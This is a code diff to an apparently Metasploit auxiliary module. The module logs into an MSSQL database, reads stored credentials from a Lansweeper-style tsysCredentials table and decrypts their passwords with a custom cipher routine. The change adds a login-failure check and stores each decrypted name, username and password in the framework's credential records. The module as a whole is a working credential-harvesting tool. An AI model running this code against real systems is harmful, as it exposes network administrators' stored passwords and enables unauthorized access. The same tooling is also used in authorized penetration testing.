@@ -49,7 +49,7 @@ class Metasploit3 < Msf::Auxiliary
     num2 = uint32(v[0])
     num3 = uint32(v[1])
 
-    for i in 0..0x1f
+    0.upto(0x1f) do
       num3 -= uint32((uint32(num2 << 4) ^ uint32(num2 >> 5)) + num2) ^
               uint32(num + k[uint32(num >> 11) & 3])
       num3 = uint32(num3)
@@ -104,10 +104,21 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
+    unless mssql_login_datastore
+      fail_with(Failure::NoAccess, "Login failed. Check credentials.")
+    end
     result = mssql_query('select Credname, Username, Password from ' + datastore['DATABASE'] +
-    '.dbo.tsysCredentials WHERE LEN(Password)>64', false) if mssql_login_datastore
+    '.dbo.tsysCredentials WHERE LEN(Password)>64', false)
     result[:rows].each do |row|
-      print_good("Credential name: #{row[0]} | username: #{row[1]} | password: #{lswdecrypt(row[2])} ")
+      pw = lswdecrypt(row[2])
+      print_good("Credential name: #{row[0]} | username: #{row[1]} | password: #{pw}")
+      report_auth_info(
+        :host => rhost,
+        :port => rport,
+        :sname => row[0],
+        :user => row[1],
+        :pass => pw
+      )
     end
     disconnect
   end
